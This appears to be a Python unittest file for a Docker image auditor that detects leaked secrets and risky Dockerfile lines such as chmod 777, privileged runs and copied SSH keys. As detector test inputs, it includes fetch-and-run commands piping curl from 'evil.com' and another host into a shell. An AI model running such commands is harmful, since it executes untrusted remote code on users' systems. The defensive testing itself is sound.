import json
import os
import re
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import docker_leak as mod

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FIXTURE = os.path.join(REPO, "fixtures", "docker-images.json")


class TestSecretPatterns(unittest.TestCase):

    def test_aws_key_detected(self):
        scanner = mod.DockerSecretScanner()
        findings = scanner.scan_text("AWSREDACTED_EXAMPLE", source="test")
        self.assertTrue(any(f["type"] == "aws_access_key" for f in findings))

    def test_jwt_detected(self):
        jwt = "REDACTEDJWT"
        scanner = mod.DockerSecretScanner()
        findings = scanner.scan_text(jwt, source="test")
        self.assertTrue(any(f["type"] == "jwt_token" for f in findings))

    def test_github_token_detected(self):
        scanner = mod.DockerSecretScanner()
        findings = scanner.scan_text("GHREDACTEDPATTOKEN", source="test")
        self.assertTrue(any(f["type"] == "github_token" for f in findings))

    def test_no_false_positive_on_clean_text(self):
        scanner = mod.DockerSecretScanner()
        findings = scanner.scan_text("pip install django==4.2", source="test")
        self.assertEqual(findings, [])


class TestDangerousPatterns(unittest.TestCase):

    def test_chmod_777(self):
        pat = mod.DANGEROUS_PATTERNS[0][0]
        self.assertTrue(pat.search("RUN chmod 777 /tmp"))

    def test_curl_pipe_sh(self):
        pat = mod.DANGEROUS_PATTERNS[1][0]
        self.assertTrue(pat.search("curl https://evil.com/install.sh | bash"))

    def test_privileged(self):
        pat = mod.DANGEROUS_PATTERNS[2][0]
        self.assertTrue(pat.search("docker run --privileged image"))


class TestRegexFragHelper(unittest.TestCase):

    def test_match_plain_name(self):
        self.assertTrue(mod.regex_match_frag("COPY .env /app/", ".env"))

    def test_match_path_name(self):
        self.assertTrue(mod.regex_match_frag("COPY secrets/credentials /tmp/", "credentials"))

    def test_no_match_on_partial(self):
        self.assertFalse(mod.regex_match_frag("COPY credentials.yml /tmp/", "credentials"))


class TestOfflineDockerAuditor(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        with open(FIXTURE, encoding="utf-8") as fh:
            cls.fixture = json.load(fh)

    def setUp(self):
        self.auditor = mod.OfflineDockerAuditor()

    def test_fixture_audit_produces_findings(self):
        findings = self.auditor.audit(self.fixture["images"])
        self.assertGreater(len(findings), 0)
        for f in findings:
            self.assertIn("severity", f)
            self.assertIn("remediation", f)
            self.assertIn("rule_id", f)

    def test_sensitive_copy_detected(self):
        image = {
            "name": "t",
            "dockerfile": "FROM alpine\nCOPY id_rsa /root/.ssh/\n",
        }
        findings = self.auditor.audit([image])
        self.assertTrue(any(f["category"] == "SENSITIVE_COPY" for f in findings))

    def test_chmod_777_detected(self):
        image = {
            "name": "t",
            "dockerfile": "FROM alpine\nRUN chmod 777 /app\n",
        }
        findings = self.auditor.audit([image])
        self.assertTrue(any(f["category"] == "WORLD_WRITABLE" for f in findings))

    def test_pipe_to_shell_detected(self):
        image = {
            "name": "t",
            "dockerfile": "FROM alpine\nRUN curl https://x.y/z | sh\n",
        }
        findings = self.auditor.audit([image])
        self.assertTrue(any(f["category"] == "PIPE_TO_SHELL" for f in findings))

    def test_empty_dockerfile_no_dockerfile_findings(self):
        image = {"name": "t", "dockerfile": ""}
        findings = self.auditor.audit([image])
        dockerfile_findings = [f for f in findings if "dockerfile" in f["category"].lower() or
                               f["category"] in ("SENSITIVE_COPY", "WORLD_WRITABLE", "PIPE_TO_SHELL", "REMOTE_ADD")]
        self.assertEqual(dockerfile_findings, [])


class TestImageLoader(unittest.TestCase):

    def test_load_fixture(self):
        images = mod.load_image_fixtures(FIXTURE)
        self.assertEqual(len(images), 1)


if __name__ == "__main__":
    unittest.main()